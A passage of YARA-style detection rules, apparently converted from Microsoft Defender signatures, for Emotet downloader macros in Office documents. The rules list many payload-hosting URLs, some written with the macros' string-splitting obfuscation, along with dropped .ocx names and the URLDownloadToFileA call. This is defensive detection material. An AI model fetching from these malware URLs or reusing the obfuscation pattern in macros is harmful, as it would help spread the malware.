        strings_accuracy = "High"
    strings:
        $x_1_1 = "://trusttransport-eg.com/wp-admin/rphDfzbs/" ascii //weight: 1
        $x_1_2 = "://thuexevanphong.com/wp-content/F6JRN/" ascii //weight: 1
        $x_1_3 = "://thisiselizabethj.com/wp-content/qeg16EZwSZy2/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMPD_2147819521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMPD!MTB"
        threat_id = "2147819521"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://sacvasanth.com/public/lyP2lh1hlJr/" ascii //weight: 1
        $x_1_2 = "://webguruindia.com/theme/wTbEyLVvMNB3j/" ascii //weight: 1
        $x_1_3 = "://stockmorehouse.com/Casa_Grande/AS4VPkTsOqWDGGO/" ascii //weight: 1
        $x_1_4 = "://watersgroupglobal.com/cgi-bin/nQmb6asGeqMlh/" ascii //weight: 1
        $x_1_5 = "://strachanclark.com/images/3gc4qCpSFYbBMDEC/" ascii //weight: 1
        $x_1_6 = "://synapse-archive.com/images/bKaMr/" ascii //weight: 1
        $x_1_7 = "://sumuvesa.com/wp-includes/rgL/" ascii //weight: 1
        $x_1_8 = "://successbl.com/wp-includes/evyoKfZVB32/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SPS_2147819641_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SPS!MTB"
        threat_id = "2147819641"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://prprofile.com/wp-admin/CIqrvgYsvBiBlIM/\",\"" ascii //weight: 1
        $x_1_2 = "://retardantedefuegoperu.com/slider/rFhAa78/\",\"" ascii //weight: 1
        $x_1_3 = "://survei.absensi.net/cc-content/YCcjkOA3ijYNu46Y/\",\"" ascii //weight: 1
        $x_1_4 = "://sysproc.net/Aplikasi_atk/iKgOnXjn/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ANPD_2147819660_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ANPD!MTB"
        threat_id = "2147819660"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://natayakim.com/_hlam/Ob78p6SxMNonofG/" ascii //weight: 1
        $x_1_2 = "://weplug.com/dom/LfdeV8H4Zy1yLFRV/" ascii //weight: 1
        $x_1_3 = "://martinmichalek.com/_sub/G1QKwEYPbt/" ascii //weight: 1
        $x_1_4 = "://winkelsupply.nl/cgi-bin/ykyyGQC6UIXrEtCt37/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QWSM_2147820040_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QWSM!MTB"
        threat_id = "2147820040"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "www.suddedx.com/jokerslot/mb2Eadbdssh/" ascii //weight: 1
        $x_1_2 = "fyambe.news/cgi-bin/Wbe40tfynFs4rC/" ascii //weight: 1
        $x_1_3 = "tassira.com/WordPress/vwZQL4Z5BPcFL3z/" ascii //weight: 1
        $x_1_4 = "hathaabeach.com/documents/pr6/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AOPD_2147820041_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AOPD!MTB"
        threat_id = "2147820041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.boucherie-thollas.com/wp-content/Q/" ascii //weight: 1
        $x_1_2 = "://www.wenne24.keurigonline52.nl/cgi-bin/FsHQ3ndkZb/" ascii //weight: 1
        $x_1_3 = "://www.supersanmutfak.com/Template/fMh7nu/" ascii //weight: 1
        $x_1_4 = "://www.venessori.com/pc97sQPqfcVam4EUtcU5/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_APPD_2147820081_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.APPD!MTB"
        threat_id = "2147820081"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://elbacolleparadiso.it/wp-admin/ZxQDOojTZNP0sKCiHo/" ascii //weight: 1
        $x_1_2 = "://ultradroneafrica.com/Contenu_US/55RPCkKNl/" ascii //weight: 1
        $x_1_3 = "://vitenetteservice.com/functions/55U7N/" ascii //weight: 1
        $x_1_4 = "://laimesnamai.lt/Vaizdo/TsZAkkQxqdmV/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_QYSM_2147820083_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.QYSM!MTB"
        threat_id = "2147820083"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "panamel.com/wp-content/FBPHSHN1AdVpn/" ascii //weight: 1
        $x_1_2 = "papillonweb.fr/wp-content/QTdf/" ascii //weight: 1
        $x_1_3 = "www.pioneerimmigration.co.in/icon/Z5z5Vx/" ascii //weight: 1
        $x_1_4 = "app.virapad.ir/assets/06LD943r/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AQPD_2147820142_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AQPD!MTB"
        threat_id = "2147820142"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.adiputranto.com/berkas/NheD9D3UM3NcmSPRYeQ/" ascii //weight: 1
        $x_1_2 = "://n\"&\"ata\"&\"yak\"&\"im.com/p\"&\"ers\"&\"on\"&\"al/o\"&\"0s\"&\"KI\"&\"zR\"&\"jM/" ascii //weight: 1
        $x_1_3 = "://m\"&\"et\"&\"a4\"&\"me\"&\"di\"&\"a.c\"&\"o\"&\"m/p\"&\"or\"&\"tf\"&\"ol\"&\"io\"&\"2/fl\"&\"b3\"&\"iu\"&\"gl\"&\"yp\"&\"sb\"&\"qT/" ascii //weight: 1
        $x_1_4 = "://h\"&\"ath\"&\"aab\"&\"ea\"&\"ch.c\"&\"o\"&\"m/d\"&\"ocu\"&\"m\"&\"en\"&\"ts/zNsC/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ARPD_2147820186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ARPD!MTB"
        threat_id = "2147820186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\dxgxe1.ocx" ascii //weight: 1
        $x_1_2 = "\\dxgxe2.ocx" ascii //weight: 1
        $x_1_3 = "\\dxgxe3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SRS_2147820188_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SRS!MTB"
        threat_id = "2147820188"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "p\"&\"s://s\"&\"we\"&\"et\"&\"zo\"&\"ne.c\"&\"o/j\"&\"s/X\"&\"V\"&\"K/\"" ascii //weight: 1
        $x_1_2 = "p\"&\"s\"&\"://t\"&\"as\"&\"sa.m\"&\"x/e\"&\"d\"&\"o\"&\"s/1\"&\"h\"&\"H\"&\"lI\"&\"Q\"&\"O/\"" ascii //weight: 1
        $x_1_3 = "p\"&\":/\"&\"/a\"&\"ss\"&\"a\"&\"re\"&\"f.m\"&\"a/o\"&\"ld_a\"&\"ssa\"&\"ref/A\"&\"2B\"&\"3P/\"" ascii //weight: 1
        $x_1_4 = "p\"&\":/\"&\"/m\"&\"ar\"&\"in\"&\"am\"&\"ot\"&\"or\"&\"si\"&\"nd\"&\"ia.i\"&\"n/qL\"&\"SY\"&\"RJ\"&\"4Y/y\"&\"sIa\"&\"Bt\"&\"nX\"&\"3j\"&\"hn\"&\"mV\"&\"yy\"&\"Z5\"&\"F/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ASPD_2147820216_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ASPD!MTB"
        threat_id = "2147820216"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://topvipescortsclub.com/assets1/s36c7eLiYV/" ascii //weight: 1
        $x_1_2 = "://socigo.eu/wPZhZP2vUM/" ascii //weight: 1
        $x_1_3 = "://thongcongnghethuthamcau.com/wp-includes/FOn2rFscjSxmSTIt5j/" ascii //weight: 1
        $x_1_4 = "://tm.gamester.com.tr/suspended-page/p6hNhp8eiRl9KVHL2NN/" ascii //weight: 1
        $x_1_5 = "://chobemaster.com/components/GxCs/" ascii //weight: 1
        $x_1_6 = "://lopespublicidade.com/cgi-bin/BueaNSrCPGYpND/" ascii //weight: 1
        $x_1_7 = "://bencevendeghaz.hu/wp-includes/S1mIEUnClr5s8krOm/" ascii //weight: 1
        $x_1_8 = "://vibesapparels.com/dQa/Qzuqq5TZO/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ATPD_2147820226_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ATPD!MTB"
        threat_id = "2147820226"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\haics1.ocx" ascii //weight: 1
        $x_1_2 = "\\haics2.ocx" ascii //weight: 1
        $x_1_3 = "\\haics3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AUPD_2147820237_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AUPD!MTB"
        threat_id = "2147820237"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://opencart-destek.com/catalog/I7bBtKT3f2hpmhrV/" ascii //weight: 1
        $x_1_2 = "://void.by/wp-content/Z/" ascii //weight: 1
        $x_1_3 = "://oncrete-egy.com/wp-content/G6l9zCsB/" ascii //weight: 1
        $x_1_4 = "://www.nekretnine-arka.hr/administrator/XS9uuam/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PKEO_2147820279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PKEO!MTB"
        threat_id = "2147820279"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//burgarellaquantumhealing.org/NRl0YMBGNh8i/" ascii //weight: 1
        $x_1_2 = "//roviel.mx/wp-includes/uX2WDFhrE/" ascii //weight: 1
        $x_1_3 = "//faisonfilms.com/wp-includes/joa/" ascii //weight: 1
        $x_1_4 = "//cncadventist.org/wp-content/9qikjVD84B/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAR_2147820304_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAR!MTB"
        threat_id = "2147820304"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://zktecovn.com/wp-admin/xxfnYY4zwOpFOgu3g1t/" ascii //weight: 1
        $x_1_2 = "://zacharywythe.com/pb_index_bak/SkEGB2c/" ascii //weight: 1
        $x_1_3 = "://zonainformatica.es/aspnet_client/pVcppgi00Dk/" ascii //weight: 1
        $x_1_4 = "://zspwolawiazowa.pl/images/mE2Zm8RKpaLk40sk/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_KAAS_2147820306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.KAAS!MTB"
        threat_id = "2147820306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.zardamarine.com/images/psQbAjrrEOXWPrS/" ascii //weight: 1
        $x_1_2 = "://labfitouts.com/cgi-bin/Rea3Iu3wGvgAbTset0/" ascii //weight: 1
        $x_1_3 = "://k\"&\"ro\"&\"n\"&\"os\"&\"tr.c\"&\"o\"&\"m/tr/6\"&\"8y\"&\"HR\"&\"hf\"&\"u\"&\"U7\"&\"Qj/" ascii //weight: 1
        $x_1_4 = "://tek\"&\"stilu\"&\"zma\"&\"ng\"&\"or\"&\"us\"&\"u.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/G\"&\"Kd\"&\"Qv\"&\"am\"&\"nP\"&\"cK/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_STS_2147820312_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.STS!MTB"
        threat_id = "2147820312"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\wdusx1.ocx" ascii //weight: 1
        $x_1_2 = "\\wdusx2.ocx" ascii //weight: 1
        $x_1_3 = "\\wdusx3.ocx" ascii //weight: 1
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BOAG_2147820339_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BOAG!MTB"
        threat_id = "2147820339"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.yedirenkajans.com/eski/y91J/" ascii //weight: 1
        $x_1_2 = "://yahir-fz.com/joy/ZnIjgkgZ18/" ascii //weight: 1
        $x_1_3 = "://www.wahkiulogistics.com.hk/upload/AvtsILsT00O/" ascii //weight: 1
        $x_1_4 = "://xenangifc.vn/wp-admin/CAzHLCrGgwXw6KTX0lMm/" ascii //weight: 1
        $x_1_5 = "://tvstv.yunethosting.rs/nesciuntquos/2SlrSdLBAv7/" ascii //weight: 1
        $x_1_6 = "://wahkiulogistics.com.hk/upload/rIpUmi7MrlOc/" ascii //weight: 1
        $x_1_7 = "://vanlaereict.nl/domains/T9G5ruQJ/" ascii //weight: 1
        $x_1_8 = "://usa-ltd.ie/wp-includes/0x7HPlZ8sGANiI5i/" ascii //weight: 1
        $x_1_9 = "://kmodo.us/cgi-bin/D/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVM_2147820347_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVM!MTB"
        threat_id = "2147820347"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "p://202.29.80.55/2021/z/\",\"" ascii //weight: 1
        $x_1_2 = "p://23.239.12.243/dealspot/SvebxVmFucz/\",\"" ascii //weight: 1
        $x_1_3 = "ps://adviceme.gr/test/SSzbOkk633/\",\"" ascii //weight: 1
        $x_1_4 = "p://xpansul.com/Xpansul_Labs/Faol8LBh5I/\",\"" ascii //weight: 1
        $x_1_5 = "p://1\"&\"8\"&\"8.1\"&\"6\"&\"6.2\"&\"4\"&\"5.1\"&\"1\"&\"2/t\"&\"em\"&\"pl\"&\"at\"&\"e/h\"&\"K3\"&\"aU\"&\"Gx\"&\"lM\"&\"DT\"&\"Kv\"&\"1E\"&\"m8\"&\"2R/\",\"" ascii //weight: 1
        $x_1_6 = "ps://w\"&\"orld\"&\"m\"&\"ed\"&\"icsky.i\"&\"n\"&\"f\"&\"o/ma\"&\"tsu\"&\"mo\"&\"to-/T\"&\"v2\"&\"IO\"&\"Gr\"&\"2p/\",\"" ascii //weight: 1
        $x_1_7 = "p://w\"&\"w\"&\"w.zv\"&\"de\"&\"si\"&\"gn.i\"&\"nf\"&\"o/c\"&\"om\"&\"po\"&\"ne\"&\"nt\"&\"s/O\"&\"FB\"&\"zy\"&\"Gy\"&\"PS\"&\"JQ\"&\"am\"&\"OD\"&\"F4\"&\"S/\",\"" ascii //weight: 1
        $x_1_8 = "p://f\"&\"t\"&\"p.y\"&\"ue\"&\"cm\"&\"r.o\"&\"r\"&\"g/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/E\"&\"oH\"&\"M9\"&\"Z7\"&\"3m\"&\"GN\"&\"43\"&\"lp\"&\"60\"&\"x/\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EMPK_2147820353_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EMPK!MTB"
        threat_id = "2147820353"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//xprosac.com/wp-admin/Ulou9WHUjUkCJCzh0cV1/" ascii //weight: 1
        $x_1_2 = "/wolle.pl/10000/pK92K8mzsUhIxNH7t/" ascii //weight: 1
        $x_1_3 = "//retardantedefuegoperu.com/slider/E3aod/" ascii //weight: 1
        $x_1_4 = "//xevis.net/xevis/tIkZkWH/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SKPK_2147820354_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SKPK!MTB"
        threat_id = "2147820354"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//buffetmazzi.com.br/ckfinder/urhhQc5W/" ascii //weight: 1
        $x_1_2 = "//www.zigorat.us/wp-admin/gUEMmDvnl/" ascii //weight: 1
        $x_1_3 = "//www.cesasin.com.ar/administrator/VNtzZVVTAJNH7/" ascii //weight: 1
        $x_1_4 = "//wehx.com.br/wp-snapshots/ds37LVL/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AVPD_2147820388_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AVPD!MTB"
        threat_id = "2147820388"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://iluminaguarapuava.com.br/wp-includes/WxiXRQhAVLruApIee95K/" ascii //weight: 1
        $x_1_2 = "://webnet.ltd.uk/wp-includes/16aute56ZVrAYR6NUL47/" ascii //weight: 1
        $x_1_3 = "://xebabanhchohang.vn/wp-content/pt/" ascii //weight: 1
        $x_1_4 = "://sigratech.de/career/TaUWpjEtkdLZ3xk/" ascii //weight: 1
        $x_1_5 = "://w\"&\"pb\"&\"izw\"&\"o\"&\"n.c\"&\"o\"&\"m/F\"&\"ex\"&\"OL\"&\"2W\"&\"x0\"&\"0o\"&\"oC\"&\"fp\"&\"gO\"&\"w/" ascii //weight: 1
        $x_1_6 = "://w\"&\"at\"&\"er\"&\"sg\"&\"ro\"&\"up\"&\"gl\"&\"ob\"&\"al.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/h\"&\"wC\"&\"u/" ascii //weight: 1
        $x_1_7 = "://w\"&\"eb\"&\"4n\"&\"ot\"&\"hi\"&\"ng.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/L\"&\"AX\"&\"oa\"&\"Au\"&\"fu/" ascii //weight: 1
        $x_1_8 = "://w\"&\"eb\"&\"on\"&\"ep\"&\"lu\"&\"s.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/q\"&\"TH\"&\"6F\"&\"TF\"&\"t4/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AWPD_2147820393_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AWPD!MTB"
        threat_id = "2147820393"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\shxui1.ocx" ascii //weight: 1
        $x_1_2 = "\\shxui2.ocx" ascii //weight: 1
        $x_1_3 = "\\shxui3.ocx" ascii //weight: 1
        $x_1_4 = {75 72 6c 6d 6f 6e [0-3] 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AXPD_2147820416_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AXPD!MTB"
        threat_id = "2147820416"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://w\"&\"w\"&\"w.a\"&\"s\"&\"e\"&\"gu\"&\"r\"&\"a\"&\"d\"&\"o\"&\"s\"&\"a\"&\"l\"&\"d\"&\"ia.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/k\"&\"el\"&\"Qu\"&\"ot\"&\"9k\"&\"of\"&\"UT\"&\"L9\"&\"0u\"&\"uE/" ascii //weight: 1
        $x_1_2 = "://f\"&\"t\"&\"p.m\"&\"ec\"&\"o\"&\"n\"&\"s\"&\"e\"&\"r.c\"&\"o\"&\"m/b\"&\"a\"&\"n\"&\"n\"&\"e\"&\"r/r\"&\"r\"&\"M\"&\"o\"&\"c\"&\"S\"&\"cr\"&\"q7/" ascii //weight: 1
        $x_1_3 = "://h\"&\"a\"&\"t\"&\"h\"&\"a\"&\"a\"&\"b\"&\"e\"&\"a\"&\"c\"&\"h.c\"&\"o\"&\"m/d\"&\"oc\"&\"um\"&\"en\"&\"ts/k\"&\"88\"&\"r\"&\"n/" ascii //weight: 1
        $x_1_4 = "://w\"&\"o\"&\"r\"&\"d\"&\"pr\"&\"es\"&\"s.a\"&\"gr\"&\"up\"&\"e\"&\"m.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/j\"&\"im\"&\"jz\"&\"u/" ascii //weight: 1
